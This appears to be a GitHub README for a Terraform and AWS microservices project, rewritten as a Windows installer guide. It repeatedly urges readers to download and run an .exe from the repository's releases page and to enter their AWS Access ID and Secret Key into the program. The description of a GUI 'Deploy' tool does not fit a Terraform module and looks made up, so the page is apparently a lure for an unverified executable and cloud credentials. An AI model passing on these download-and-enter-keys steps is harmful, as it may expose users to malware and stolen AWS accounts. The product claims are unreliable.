# ⚙️ terraform-aws-validated-compute - Manage AWS Microservices Easily

[![Download Release](https://img.shields.io/badge/Download-terraform--aws--validated--compute-brightgreen?style=for-the-badge)](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/releases)

---

## 📦 What This Application Does

This software helps you set up and manage parts of Amazon Web Services (AWS) automatically. It uses code to create and organize servers that run microservices using Docker containers on EC2 machines. The setup also checks itself using Python scripts to make sure everything works correctly before you start using it.

You do not need to write any code to use this. The tool automates the infrastructure and deployment tasks for you. This can save you from manually configuring AWS services or dealing with errors during setup.

---

## 💻 System Requirements

Make sure your computer meets these basics before trying to run the software:

- Operating System: Windows 10 or higher
- Memory: At least 8 GB RAM
- Disk Space: Minimum 2 GB free space
- Internet: Stable connection to download files and connect AWS services
- AWS Account: Active AWS account with permission to create EC2 instances, auto-scaling groups, networking components, and use AWS API
- AWS CLI installed and configured with your credentials (optional but recommended)

---

## 🚀 How to Download and Install

### Step 1: Visit the Download Page

Click the button below to go to the official download page:

[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/releases)

This page contains the latest versions of the software. Find the release suitable for Windows. The files you want typically include the main setup package and any supporting tools.

### Step 2: Choose the Correct File

Look for a file labeled for Windows or with `.exe` or `.zip` extensions. If you download a `.zip` file, you will need to extract it before running the software.

Save the file to an easy-to-find location on your computer, like your Desktop or Downloads folder.

### Step 3: Run the Installer

- If you have an `.exe` file, double-click it and follow the instructions shown on the screen.
- If you have a `.zip` file, right-click and select “Extract All,” then open the extracted folder and look for an `.exe` file to run.

The installer will place the necessary files on your system and create shortcuts if needed.

---

## ⚙️ How to Use the Software

### Step 1: Open the Application

Start the program from the Start menu or desktop shortcut. The program window will open.

### Step 2: Set Up Your AWS Credentials

Before you can use the software, it needs to connect to your AWS account. You can provide credentials by:

- Configuring the AWS CLI on your computer with `aws configure` (recommended), or
- Entering your Access ID and Secret Key directly in the software (less secure option).

### Step 3: Choose Your Infrastructure Settings

The software guides you to select key options for your AWS setup. This includes:

- Number and type of EC2 instances
- Docker images you want to deploy on those instances
- Validation methods you want to run to check deployments

The program uses Terraform under the hood to create and manage this infrastructure automatically.

### Step 4: Deploy Your Microservices

Click the “Deploy” button. The application will:

- Start creating AWS EC2 instances and auto-scaling groups
- Configure the servers
- Deploy Docker containers with your microservices
- Run validation scripts to check deployment success

Progress will be shown step-by-step. The whole process may take several minutes depending on your selection and internet speed.

### Step 5: Monitor Deployment Validation

After deployment, the software runs Python scripts that verify if everything launched correctly. These checks review:

- Server health
- Container running states
- Network configuration

You will see a clear report. If any issues arise, the report suggests steps to resolve them.

---

## 🔧 Common Tasks and Tips

- **Updating the Setup:** To change your infrastructure, update settings in the application and redeploy. This will apply new configurations automatically.
- **Stopping Services:** Use the stop or terminate option to remove AWS resources and avoid extra costs.
- **Logs and Troubleshooting:** Access logs from the application to see detailed messages about each step. These help identify and fix problems.
- **Learn More About AWS:** Understanding basic AWS concepts like EC2, auto-scaling groups, and VPCs will help you use this tool better.
- **Use AWS Free Tier:** If you are new to AWS, try using the free tier to avoid unexpected charges while testing.

---

## 🛠️ Background Technologies

This software combines several technologies under the hood:

- **Terraform:** Tool that manages infrastructure as code. Automates creating and updating cloud resources.
- **AWS EC2 & Auto Scaling:** Amazon cloud servers that can adjust in number automatically based on load.
- **Docker:** Runs applications inside containers so they work the same everywhere.
- **Python Scripts:** Used for checking if your deployment works as expected.

You don’t need to interact with these tools directly. The program handles them through a simple interface.

---

## 🎯 Troubleshooting

If you run into issues:

- Check your internet connection.
- Confirm your AWS credentials are valid and have the needed permissions.
- Make sure your Windows system meets the requirements listed above.
- Review logs for error messages inside the application.
- Restart the deployment process if it stops unexpectedly.
- Consult AWS limits in your account; you might need to increase allowed EC2 instances or other resources.

---

## 🔗 Useful Links

- AWS Account Setup: https://aws.amazon.com/getting-started/
- Terraform Documentation: https://www.terraform.io/docs/index.html
- Docker Documentation: https://docs.docker.com/

---

## 📥 Download the Software

Return to the release page when ready to download or update:

[Download Latest Release](https://github.com/Sinalo-OOS/terraform-aws-validated-compute/releases)